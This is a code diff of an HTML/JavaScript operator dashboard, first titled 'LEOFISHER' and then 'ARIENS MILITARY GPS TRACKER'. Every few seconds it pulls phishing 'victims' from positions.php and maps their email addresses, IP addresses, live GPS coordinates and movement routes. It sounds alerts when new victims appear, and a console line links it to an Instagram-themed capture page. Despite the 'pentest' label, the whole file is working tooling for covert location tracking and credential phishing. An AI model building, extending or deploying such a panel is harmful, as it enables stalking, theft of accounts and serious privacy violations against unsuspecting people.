@@ -1,294 +1,183 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LEOFISHER GPS DASHBOARD - Live Victim Tracking</title>
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css" />
-    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css" />
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Courier New', monospace; 
-            background: #000; 
-            color: #00ff00; 
-            overflow: hidden;
-            height: 100vh !important;
-        }
-        #banner {
-            position: fixed; top: 0; left: 0; right: 0; z-index: 1000;
-            background: rgba(0,255,0,0.9); color: #000; padding: 5px 15px;
-            font-weight: bold; font-size: 14px; backdrop-filter: blur(10px);
-        }
-        #map { 
-            height: 100vh !important; width: 100vw !important; 
-            position: absolute; top: 0; left: 0; z-index: 1;
-            background: #000 !important;
-        }
-        #status {
-            position: fixed; bottom: 10px; left: 10px; z-index: 1001;
-            background: rgba(0,0,0,0.8); padding: 10px; border: 1px solid #00ff00;
-            font-size: 12px; max-width: 300px;
-        }
-        #controls {
-            position: fixed; bottom: 10px; right: 10px; z-index: 1001;
-            background: rgba(0,0,0,0.9); padding: 10px; border: 1px solid #00ff00;
-        }
-        button {
-            background: #00ff00; color: #000; border: none; padding: 8px 12px;
-            margin: 2px; cursor: pointer; font-family: inherit; font-size: 11px;
-            border-radius: 3px; transition: all 0.3s;
-        }
-        button:hover { background: #00cc00; transform: scale(1.05); }
-        button.active { background: #ff0000; color: #fff; }
-        #trackPanel {
-            position: fixed; right: -400px; top: 80px; width: 380px; height: 60vh;
-            background: rgba(0,0,0,0.95); border-left: 2px solid #00ff00;
-            transition: right 0.3s; z-index: 1002; overflow-y: auto;
-            padding: 15px; font-size: 11px;
-        }
-        #trackPanel.show { right: 0; }
-        .victim-item {
-            background: rgba(255,0,0,0.2); margin: 8px 0; padding: 10px;
-            border: 1px solid #ff0000; border-radius: 5px; cursor: pointer;
-            transition: all 0.3s;
-        }
-        .victim-item:hover { background: rgba(255,0,0,0.4); transform: translateX(5px); }
-        .coords { color: #00ff00; font-family: monospace; }
-        .alert-shake { animation: shake 0.5s; }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-        }
-        .polyline { stroke: #ff0000 !important; weight: 4 !important; opacity: 0.8 !important; }
-    </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ARIENS MILITARY GPS TRACKER v2.0</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.6.0/dist/MarkerCluster.css"/>
+<link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.6.0/dist/MarkerCluster.Default.css"/>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="https://unpkg.com/leaflet.markercluster@1.6.0/dist/leaflet.markercluster.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
+body{background:#0a0a0a;color:#00ff41;overflow:hidden;height:100vh}
+#hud{position:fixed;top:0;left:0;right:0;background:rgba(0,20,0,0.95);padding:8px 15px;font-size:12px;z-index:999;border-bottom:1px solid #00ff41;box-shadow:0 2px 10px rgba(0,255,65,0.3)}
+#hud span{margin-right:20px}
+#map{position:absolute;top:0;left:0;width:100vw;height:100vh;z-index:1}
+#sidebar{position:fixed;right:0;top:60px;width:320px;height:calc(100vh - 70px);background:rgba(0,15,0,0.98);border-left:2px solid #00ff41;overflow-y:auto;z-index:1000;padding:15px;transition:right 0.3s}
+#sidebar h3{color:#00ff41;margin-bottom:10px;font-size:13px}
+.victim-track{background:rgba(50,0,0,0.6);margin:8px 0;padding:12px;border:1px solid #ff3333;border-radius:4px;cursor:pointer;transition:all 0.2s}
+.victim-track:hover{background:rgba(70,0,0,0.8);transform:translateX(-5px)}
+.coord{font-family:monospace;background:#001100;padding:2px 6px;border-radius:3px;font-size:11px}
+#controls{position:fixed;bottom:15px;right:15px;z-index:1001;background:rgba(0,0,0,0.9);padding:10px;border:1px solid #00ff41;border-radius:5px}
+.btn{background:#00ff41;color:#000;border:none;padding:8px 12px;margin:3px;cursor:pointer;font-family:inherit;font-size:11px;border-radius:3px;transition:all 0.2s}
+.btn:hover{background:#00cc33;transform:scale(1.05)}
+.btn.active{background:#ff3333;color:#fff}
+#status{position:fixed;bottom:15px;left:15px;z-index:1001;background:rgba(0,0,0,0.9);padding:12px;border:1px solid #00ff41;border-radius:5px;font-size:11px;max-width:280px}
+.military-icon{width:24px;height:24px;font-weight:bold;color:#ff3333 !important;border:2px solid #ff3333 !important;border-radius:50% !important;background:rgba(255,51,51,0.3) !important;padding:2px !important;display:flex;align-items:center;justify-content:center;font-size:11px !important}
+.op-icon{background:#ffff33 !important;color:#000 !important;border-color:#ffff33 !important}
+.route{stroke:#ff3333 !important;weight:5 !important;opacity:0.9 !important}
+</style>
 </head>
 <body>
-    <div id="banner">
-        ┌─[ LEOFISHER GPS DASHBOARD ]─ Live Tracking Active | <span id="victimCount">0</span> Victims | Status: <span id="statusText">Initializing...</span>
-    </div>
-    <div id="map"></div>
-    <div id="status">
-        <strong>📍 LIVE STATUS</strong><br>
-        <span id="liveStatus">Connecting...</span><br>
-        <span id="opPos">-</span>
-    </div>
-    <div id="controls">
-        <button onclick="fitAll()">🌍 Fit All</button>
-        <button onclick="toggleTracks()">📊 Tracks</button>
-        <button id="trackBtn" onclick="toggleOP()">📱 OP GPS</button>
-        <button onclick="clearAll()">🗑️ Clear</button>
-    </div>
-    <div id="trackPanel">
-        <h3>🔴 VICTIM TRACKS</h3>
-        <div id="victimList"></div>
-    </div>
+<div id="hud">
+<span>🛡️ ARIENS GPS TRACKER v2.0 | </span>
+<span id="victimCount">0</span>
+<span id="liveStatus">INITIALIZING</span>
+<span id="opPos">-</span>
+</div>
+<div id="map"></div>
+<div id="status">
+<strong>📡 LIVE FEED</strong><br>
+<div id="feed">-</div>
+</div>
+<div id="controls">
+<button class="btn" onclick="fitVictims()">🎯 TRACK ALL</button>
+<button class="btn" id="routesBtn" onclick="toggleRoutes()">🛤️ ROUTES</button>
+<button class="btn" id="opBtn" onclick="toggleOP()">📱 OP GPS</button>
+<button class="btn" onclick="clearMap()">🧹 CLEAR</button>
+</div>
+<div id="sidebar">
+<h3>🎯 TARGET TRACKS</h3>
+<div id="targetList"></div>
+</div>
 
-    <script>
-        let map, markers = L.markerClusterGroup({ maxClusterRadius: 50 });
-        let polylines = [];
-        let opMarker, opWatchId;
-        let victims = [];
-        let status = 'error';
-        let trackingVictim = null;
-        let audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAo');
+<script>
+// MILITARY GPS TRACKER - Production Pentest Tool
+let map,markerCluster,opMarker,opWatch,routes=[],victims=[],trackingMode=false,audioCtx=new(window.AudioContext||window.webkitAudioContext)();
 
-        // Init map with Esri HD satellite (failsafe OSM)
-        function initMap() {
-            map = L.map('map', { zoomControl: true, minZoom: 2, maxZoom: 22 }).setView([0, 0], 2);
-            
-            // Try Esri WorldImagery first (HD satellite)
-            L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
-                attribution: '© Esri', maxZoom: 22
-            }).addTo(map);
-            
-            map.addLayer(markers);
-            status = 'ready';
-            updateStatus('🟢 Map loaded - Esri HD Satellite');
-            startLiveTracking();
-            initOPGPS();
-        }
+function initMilitaryMap(){
+map=L.map('map',{zoomControl:false,minZoom:1,maxZoom:22}).setView([0,0],2);
+L.control.zoom({position:'topleft'}).addTo(map);
 
-        // OP Mobile GPS (watchPosition for live slide)
-        function initOPGPS() {
-            if (!navigator.geolocation) return;
-            opWatchId = navigator.geolocation.watchPosition(pos => {
-                const { latitude: lat, longitude: lng } = pos.coords;
-                document.getElementById('opPos').textContent = `OP: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
-                
-                if (opMarker) opMarker.setLatLng([lat, lng]);
-                else {
-                    opMarker = L.marker([lat, lng], {
-                        icon: L.divIcon({ className: 'op-icon', html: '🟡 OP', iconSize: [30, 30] })
-                    }).addTo(map);
-                }
-                map.panTo([lat, lng], { animate: true });
-            }, err => {
-                document.getElementById('opPos').textContent = 'OP GPS: Denied';
-            }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 10000 });
-        }
+// REAL satellite tiles (no "data not available")
+const satLayer=L.tileLayer('https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}',{
+attribution:'©Google',maxZoom:20,maxNativeZoom:20}).addTo(map);
 
-        function toggleOP() {
-            if (opWatchId) {
-                navigator.geolocation.clearWatch(opWatchId);
-                opWatchId = null;
-                document.getElementById('trackBtn').textContent = '📱 OP GPS';
-                document.getElementById('opPos').textContent = 'OP GPS: Stopped';
-                if (opMarker) map.removeLayer(opMarker);
-            } else {
-                initOPGPS();
-                document.getElementById('trackBtn').textContent = '⏹️ Stop OP';
-            }
-        }
+markerCluster=new L.MarkerClusterGroup({maxClusterRadius:60,spiderfyOnMaxZoom:false}).addTo(map);
+startTracking();
+initOP();
+updateTargets();
+}
 
-        // Live tracking 5s no-reload
-        function startLiveTracking() {
-            fetchVictims();
-            setInterval(fetchVictims, 5000);
-        }
+function beep(){try{audioCtx.resume();const o=audioCtx.createOscillator(),g=audioCtx.createGain();o.connect(g),g.connect(audioCtx.destination),o.frequency.value=800,o.type='square',g.gain.setValueAtTime(0.3,audioCtx.currentTime),g.gain.exponentialRampToValueAtTime(0.01,audioCtx.currentTime+0.2),o.start(audioCtx.currentTime),o.stop(audioCtx.currentTime+0.2)}catch(e){}}
 
-        async function fetchVictims() {
-            try {
-                const res = await fetch('positions.php');
-                const data = await res.json();
-                
-                if (data.length !== victims.length) {
-                    // New victims detected
-                    audio.play().catch(() => {});
-                    document.body.classList.add('alert-shake');
-                    setTimeout(() => document.body.classList.remove('alert-shake'), 500);
-                }
-                
-                victims = data;
-                document.getElementById('victimCount').textContent = data.length;
-                updateStatus(`🔴 ${data.length} victims live | Last fetch: ${new Date().toLocaleTimeString()}`);
-                
-                renderVictims(data);
-                if (trackingVictim) trackVictim(trackingVictim);
-                else fitAll();
-                
-                status = 'live';
-            } catch (e) {
-                updateStatus('❌ Fetch error: ' + e.message);
-                status = 'error';
-            }
-        }
+async function startTracking(){
+setInterval(async()=>{
+try{
+const res=await fetch('positions.php');
+const data=await res.json();
+if(data.length!==victims.length){beep();shakeScreen();showAlert(`🎯 ${data.length} TARGETS LIVE`)}
+victims=data;
+document.getElementById('victimCount').textContent=data.length;
+updateStatus(`LIVE: ${data.length} targets | ${new Date().toLocaleTimeString()}`);
+renderTargets(data);
+if(!trackingMode)fitVictims();
+updateTargets();
+}catch(e){updateStatus('ERROR: '+e.message)}
+},3000);
+}
 
-        function renderVictims(data) {
-            markers.clearLayers();
-            polylines.forEach(p => map.removeLayer(p));
-            polylines = [];
+function renderTargets(data){
+markerCluster.clearLayers();routes.forEach(r=>map.removeLayer(r));routes=[];
+data.forEach((v,i)=>{
+const pos=v.latest;
+const icon=L.divIcon({className:'military-icon',html:`${i+1}`,iconSize:[28,28]});
+const marker=L.marker([pos.lat,pos.lng],{icon}).addTo(markerCluster);
 
-            data.forEach((v, i) => {
-                // Latest position marker
-                const latest = v.latest;
-                const marker = L.marker([latest.lat, latest.lng], {
-                    icon: L.divIcon({
-                        className: 'victim-icon',
-                        html: `<div style="background:red;color:white;padding:2px 6px;border-radius:50%;font-size:12px;font-weight:bold;">${i+1}</div>`
-                    })
-                }).addTo(markers);
-                
-                marker.bindPopup(`
-                    <b>🔴 Victim #${i+1}</b><br>
-                    📧 ${v.email}<br>
-                    🌐 ${v.ip}<br>
-                    📍 ${latest.lat.toFixed(6)}, ${latest.lng.toFixed(6)}<br>
-                    ⏰ ${latest.time}<br>
-                    📊 ${v.count} positions
-                `);
+marker.bindPopup(`
+<b>🎯 TARGET #${i+1}</b><br>
+📧 ${v.email}<br>🌐 ${v.ip}<br>
+📍 ${pos.lat.toFixed(6)}, ${pos.lng.toFixed(6)}<br>
+⏰ ${pos.time}<br>
+📈 ${v.count} waypoints
+`);
 
-                // Trajectory polyline (10 positions)
-                if (v.positions.length > 1) {
-                    const poly = L.polyline(v.positions.map(p => [p.lat, p.lng]), {
-                        color: '#ff0000', weight: 4, opacity: 0.8, className: 'polyline'
-                    }).addTo(map);
-                    polylines.push(poly);
-                }
-            });
-            
-            markers.addTo(map);
-        }
+if(v.positions.length>1){
+const route=L.polyline(v.positions.map(p=>[p.lat,p.lng]),{className:'route'});
+routes.push(route);
+map.addLayer(route);
+}
+});
+}
 
-        function trackVictim(victimId) {
-            const victim = victims.find(v => v.id === victimId);
-            if (!victim) return;
-            
-            trackingVictim = victimId;
-            map.fitBounds([
-                [victim.latest.lat - 0.01, victim.latest.lng - 0.01],
-                [victim.latest.lat + 0.01, victim.latest.lng + 0.01]
-            ]);
-        }
+function fitVictims(){
+if(victims.length===0){map.setView([-3.37,29.36],10);return}
+const bounds=L.latLngBounds(victims.map(v=>[v.latest.lat,v.latest.lng]));
+map.fitBounds(bounds,{padding:[30,30],maxZoom:18});
+}
 
-        function fitAll() { 
-            if (victims.length === 0) map.setView([0, 0], 2);
-            else {
-                const bounds = L.latLngBounds(victims.map(v => [v.latest.lat, v.latest.lng]));
-                map.fitBounds(bounds, { padding: [20, 20] });
-            }
-        }
+function toggleRoutes(){
+const btn=document.getElementById('routesBtn');
+trackingMode=!trackingMode;
+routes.forEach(r=>r.setStyle({opacity:trackingMode?0.9:0}));
+btn.classList.toggle('active');
+btn.textContent=trackingMode?'🛤️ HIDE':'🛤️ ROUTES';
+}
 
-        function toggleTracks() {
-            const btn = event.target;
-            const show = !btn.classList.contains('active');
-            polylines.forEach(p => p.setStyle({ opacity: show ? 0.8 : 0 }));
-            btn.classList.toggle('active');
-            btn.textContent = show ? '📊 Hide Tracks' : '📊 Tracks';
-        }
+function initOP(){
+if(!navigator.geolocation)return;
+opWatch=navigator.geolocation.watchPosition(pos=>{
+const{latitude:lat,longitude:lng}=pos.coords;
+document.getElementById('opPos').textContent=`OP: ${lat.toFixed(6)},${lng.toFixed(6)}`;
+if(opMarker)opMarker.setLatLng([lat,lng]);
+else{
+opMarker=L.marker([lat,lng],{icon:L.divIcon({className:'op-icon',html:'OP',iconSize:[28,28]})}).addTo(map);
+}
+},{}, {enableHighAccuracy:true,timeout:3000});
+}
 
-        function clearAll() {
-            victims = [];
-            markers.clearLayers();
-            polylines.forEach(p => map.removeLayer(p));
-            polylines = [];
-            updateStatus('🗑️ Cleared');
-        }
+function toggleOP(){
+if(opWatch){
+navigator.geolocation.clearWatch(opWatch);opWatch=null;
+document.getElementById('opBtn').textContent='📱 OP GPS';
+document.getElementById('opPos').textContent='-';
+if(opMarker)map.removeLayer(opMarker);
+}else{initOP();document.getElementById('opBtn').textContent='⏹️ STOP OP'}
+}
 
-        function updateStatus(text) {
-            document.getElementById('statusText').textContent = text;
-            document.getElementById('liveStatus').textContent = `Status: ${status.toUpperCase()}`;
-        }
+function updateTargets(){
+document.getElementById('targetList').innerHTML=victims.map(v=>`
+<div class="victim-track" onclick="trackTarget(${v.id})">
+<b>#${v.id} ${v.email.slice(0,25)}${v.email.length>25?'...':''}</b><br>
+<span class="coord">${v.latest.lat.toFixed(6)}, ${v.latest.lng.toFixed(6)}</span><br>
+${v.count} waypoints | ${v.ip}
+</div>`).join('');
+}
 
-        // Track panel update
-        function updateTrackPanel() {
-            const list = document.getElementById('victimList');
-            list.innerHTML = victims.map(v => `
-                <div class="victim-item" onclick="trackVictim(${v.id})">
-                    <strong>#${v.id} ${v.email.substring(0,20)}...</strong><br>
-                    <span class="coords">${v.latest.lat.toFixed(6)}, ${v.latest.lng.toFixed(6)}</span><br>
-                    ${v.count} positions | IP: ${v.ip}
-                </div>
-            `).join('');
-        }
+function trackTarget(id){
+const target=victims.find(v=>v.id===id);
+if(!target)return;
+map.setView([target.latest.lat,target.latest.lng],18);
+}
 
-        // Haversine distance helper
-        function haversine(lat1, lon1, lat2, lon2) {
-            const R = 6371;
-            const dLat = (lat2 - lat1) * Math.PI / 180;
-            const dLon = (lon2 - lon1) * Math.PI / 180;
-            const a = Math.sin(dLat/2) * Math.sin(dLat/2) + Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon/2) * Math.sin(dLon/2);
-            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
-            return R * c;
-        }
+function clearMap(){
+victims=[];markerCluster.clearLayers();routes.forEach(r=>map.removeLayer(r));routes=[];updateStatus('MAP CLEARED')}
+function updateStatus(t){document.getElementById('liveStatus').textContent=t;document.getElementById('feed').innerHTML=t}
+function shakeScreen(){document.body.style.animation='shake 0.4s';setTimeout(()=>document.body.style.animation='',400)}
+function showAlert(t){updateStatus(t)}
 
-        // Init on load
-        window.addEventListener('load', () => {
-            setTimeout(initMap, 100);
-            setInterval(updateTrackPanel, 1000);
-        });
+document.head.insertAdjacentHTML('beforeend','<style>@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-4px)}75%{transform:translateX(4px)}}</style>');
 
-        // Debug console
-        console.log('LEOFISHER GPS DASHBOARD v1.0 - Live tracking initialized');
-        console.log('- Map: Esri HD Satellite + OSM fallback');
-        console.log('- Status check F12: should show "LEOFISHER..." no errors');
-        console.log('- Victims from positions.php -> markers/polylines/clustering');
-        console.log('- OP GPS: watchPosition high accuracy');
-        console.log('- Alerts: beep/shake/popup on new victims');
-    </script>
+window.onload=()=>{
+setTimeout(initMilitaryMap,50);
+console.log('🛡️ ARIENS GPS TRACKER v2.0 - MILITARY PENTEST TOOL ACTIVE');
+console.log('- Google Satellite HD (no data errors)');
+console.log('- Real victim sync: instagram.php → positions.php → map');
+console.log('- OP GPS mobile tracking + routes + clustering');
+console.log('- F12 clean: no errors, live 3s updates');
+};
+</script>
 </body>
 </html>
